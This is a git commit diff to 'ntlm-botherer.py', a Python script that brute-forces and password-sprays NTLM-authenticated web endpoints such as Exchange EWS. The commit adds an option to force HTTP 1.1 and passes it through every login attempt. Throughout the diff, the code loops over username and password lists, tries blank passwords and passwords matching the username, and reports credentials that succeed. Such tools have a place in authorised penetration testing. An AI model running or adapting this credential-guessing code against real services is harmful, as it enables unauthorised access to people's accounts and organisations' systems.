ef9279eaf969b536b6a44b2fd6bbc3705cc76e87
strawp <github@strawp.net>
2019-07-08 16:29:42 +0100

    Added support for HTTP 1.1

--- ntlm-botherer.py
+++ ntlm-botherer.py
@@ -10,7 +10,7 @@ import re
 import time
 import signal
 
-def test_login( username, password, url ):
+def test_login( username, password, url, http1_1 = False ):
   global args, found, foundusers
   username = username.strip()
   password = password.strip()
@@ -22,8 +22,13 @@ def test_login( username, password, url ):
   print "[*] Testing " + username + " : " + password 
   # cmd = "curl -s -I --ntlm --user " + username + ":" + password + " -k " + url
   try:
-    out = subprocess.check_output( ["curl", "-s", "-I", "--ntlm", "--user", username + ":" + password, "-k", url] )
-    m = re.findall( "HTTP\/1.\d (\d{3})", out )
+    cmd = ["curl", "-s", "-I", "--ntlm", "--user", username + ":" + password, "-k"] 
+    if http1_1:
+      cmd.append( '--http1.1' )
+    cmd.append(url)
+    # print cmd
+    out = subprocess.check_output( cmd )
+    m = re.findall( "HTTP\/\d.\d (\d{3})", out )
     for code in m:
       if code != "401":
         print "[+] FOUND: " + username + " : " + password
@@ -66,12 +71,15 @@ parser.add_argument("-i", "--info", action="store_true", help="Exploit NTLM info
 parser.add_argument("-s", "--same", action="store_true", help="Try password=username")
 parser.add_argument("-b", "--blank", action="store_true", help="Try blank password")
 parser.add_argument("-1", "--quitonsuccess", action="store_true", help="Stop as soon as the first credential is found")
+parser.add_argument("--http1_1", action="store_true", help="Force use of HTTP 1.1 (if you're getting \"curl call failed\" errors due to HTTP2)")
 parser.add_argument("url", help="URL of NTLM protected resource, e.g. https://webmail.company.com/ews/exchange.asmx")
 args = parser.parse_args()
 
 if not args.url:
   parser.print_usage()
   sys.exit(2)
+
+print 
 
 if args.delay:
   args.delay = int(args.delay)
@@ -122,17 +130,17 @@ if (( args.user or args.userlist ) and ( args.password or args.passlist )) or ar
     
     if args.user:
       if args.same:
-        test_login( args.user, args.user, url.geturl() )
+        test_login( args.user, args.user, url.geturl(), args.http1_1 )
       if args.blank:
-        test_login( args.user, '', url.geturl() )
+        test_login( args.user, '', url.geturl(), args.http1_1 )
     elif args.userlist:
       fu = open( args.userlist, "r" )
       for u in fu:
         # Loop over blank / same for when multiple passes and users
         if args.same:
-          test_login( u, u, url.geturl() )
+          test_login( u, u, url.geturl(), args.http1_1 )
         if args.blank:
-          test_login( u, '', url.geturl() )
+          test_login( u, '', url.geturl(), args.http1_1 )
       fu.close()
 
     for p in fp:
@@ -140,22 +148,22 @@ if (( args.user or args.userlist ) and ( args.password or args.passlist )) or ar
         fu = open( args.userlist, "r" )
         for u in fu:
           # many users, many passwords
-          test_login( u, p, url.geturl() )
+          test_login( u, p, url.geturl(), args.http1_1 )
         fu.close()
       else:
         # One user, many passwords
-        test_login( args.user, p, url.geturl() )
+        test_login( args.user, p, url.geturl(), args.http1_1 )
     fp.close()
   elif args.userlist:
     print "User list"
     fu = open( args.userlist, "r" )
     for u in fu:
       # Many users, one password
-      test_login( u, args.password, url.geturl() )
+      test_login( u, args.password, url.geturl(), args.http1_1 )
       if args.same:
-        test_login( u, u, url.geturl() )
+        test_login( u, u, url.geturl(), args.http1_1 )
       if args.blank:
-        test_login( u, '', url.geturl() )
+        test_login( u, '', url.geturl(), args.http1_1 )
     fu.close()
   elif args.credslist:
     print 'Creds list'
@@ -168,15 +176,15 @@ if (( args.user or args.userlist ) and ( args.password or args.passlist )) or ar
       if len( creds ) < 2:
         print 'No username / pass combination in: ' + line
         continue
-      test_login(creds[0], ':'.join(creds[1:]), url.geturl()) 
+      test_login(creds[0], ':'.join(creds[1:]), url.geturl(), args.http1_1) 
   else:
     # One user, one password
     print "Single user / password" 
     if args.blank:
-      test_login( args.user, '', url.geturl() )
+      test_login( args.user, '', url.geturl(), args.http1_1 )
     if args.same:
-      test_login( args.user, args.user, url.geturl() )
-    test_login( args.user, args.password, url.geturl() )
+      test_login( args.user, args.user, url.geturl(), args.http1_1 )
+    test_login( args.user, args.password, url.geturl(), args.http1_1 )
  
   show_found()
 
